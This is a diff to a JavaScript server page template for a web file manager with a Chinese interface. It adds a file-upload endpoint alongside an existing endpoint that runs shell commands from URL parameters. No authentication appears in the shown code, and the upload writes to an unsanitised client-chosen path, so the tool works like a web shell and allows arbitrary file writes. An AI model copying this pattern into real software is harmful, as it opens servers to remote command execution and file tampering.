@@ -38,17 +38,20 @@ if(task==='shell') {
   return
 }
 
+if(task==='upfile') {
+  header('Content-Type', 'text/json')
+  echo(await new Promise(r=>{
+    fs.writeFile(fdir+'/'+query.fn, postbody, (e)=>{
+      r(e?e.message:'Success')
+    })
+  }))
+  return
+}
+
 if(task==='ls') {
 ?><meta charset='utf8' />
 <style type="text/css">
-.cmdarea,.list{
-  position: fixed;
-  top: 50px;
-  bottom: 0;
-  overflow: auto;
-}
 .list{
-  width: calc(50% - 50px);
   left:0;
   white-space: nowrap;
 }
@@ -62,13 +65,32 @@ if(task==='ls') {
     padding: 10px 26px;
     z-index: 10;
 }
+.ctls{
+  position: fixed;
+    right: 0;
+    top: 50px;
+    background: #eee;
+    z-index: 22;
+}
+.ctls div{
+  padding: 5px 10px;
+    border-bottom: 1px solid #ccc;
+    width: 100px;
+    cursor: pointer;
+}
 .cmdarea{
     position: fixed;
-    right: 0;
+    left: 0;
     background: #dcdcdc;
     padding: 5px 5px;
     z-index: 11;
-    width: 50%;
+    width: 100%;
+    top: 50px;
+    bottom: 0;
+    overflow: auto;
+}
+.hidden{
+  display: none;
 }
 .dirn.pos{
   visibility: hidden;
@@ -112,6 +134,9 @@ if(task==='ls') {
   opacity: .8;
   margin: 0 10px;
 }
+[type=file]{
+  display: none;
+}
 </style>
 <script type="text/javascript">
 document.onclick=function(e) {
@@ -120,22 +145,49 @@ document.onclick=function(e) {
   if(fdir) location='?fdir='+fdir
   else if(dl) location='?task=dl&fdir='+dl
 }
-function sendcmd() {
-  if(!cmd.value) return
+function xhr(url, data, cb) {
   var x=new XMLHttpRequest
-  x.open('GET', '/?fdir=<?js echo(encodeURIComponent(fdir)) ?>&task=shell&cmd='+cmd.value,1)
+  x.open(data?'POST':'GET', url,1)
   x.onreadystatechange=function(){
     if(x.readyState^4) return;
-    var a=JSON.parse(x.responseText)
+    cb(x.responseText)
+  }
+  x.send(data)
+}
+function sendcmd() {
+  if(!cmd.value) return
+  xhr('/?fdir=<?js echo(encodeURIComponent(fdir)) ?>&task=shell&cmd='+cmd.value, '', function(res) {
+    var a=JSON.parse(res)
     stdout1.innerHTML=a.stdout||'<i>empty</i>'
     stderr1.innerHTML=a.stderr||'<i>empty</i>'
+  })
+}
+function settype(n) {
+  localStorage.setItem('settype', n)
+  location.reload()
+}
+function upfile() {
+  var n=new FileReader
+  var f0=upf.files[0]
+  n.readAsBinaryString(f0)
+  n.onload=function(){
+    xhr('/?fdir=<?js echo(encodeURIComponent(fdir)) ?>&task=upfile&fn='+encodeURIComponent(f0.name), n.result, function(res) {
+      alert(res)
+      location.reload()
+    })
   }
-  x.send()
 }
 </script><?js
 }
 
 if(task==='ls') {
+
+  echo(`<div class="ctls">
+    <div onclick="settype(0)">文件列表</div>
+    <div onclick="settype(1)">shell</div>
+    <div onclick="upf.click()">上传文件<input onchange="upfile()" type="file" id="upf" /></div>
+  </div>`)
+
   const paths=path.resolve(fdir).split(path.sep)
   for(let g=0; g<2; g++) {
   echo('<div class="dirn '+(g?'':'pos')+'">')
@@ -147,7 +199,7 @@ if(task==='ls') {
   echo('</div>')
   }
 
-  echo(`<div class="cmdarea">
+  echo(`<div class="cmdarea" id='cmdarea'>
     <input id="cmd" /><button onclick="sendcmd()">shell</button>
     <div id="cmd_res">
       <div id="stdout">
@@ -177,7 +229,7 @@ if(task==='ls') {
   }catch(e) {
     echo('<div class="noaccess">无权访问</div>')
   }
-  echo('<ol class="list">')
+  echo('<ol class="list" id="list">')
   fns.map(({fn, isDir, stat, err})=>{
     let pfdir=paths2fdir(paths.concat(fn))
     if(err) echo(`<li class="dir" data-noaccess>${fn}</li>`)
@@ -189,3 +241,12 @@ if(task==='ls') {
   })
   echo('</ol>')
 }
+?><script type="text/javascript">
+if(!(localStorage.settype*1)) {
+  cmdarea.className='cmdarea hidden'
+  list.className='list'
+}else{
+  cmdarea.className='cmdarea'
+  list.className='list hidden'
+}
+</script>
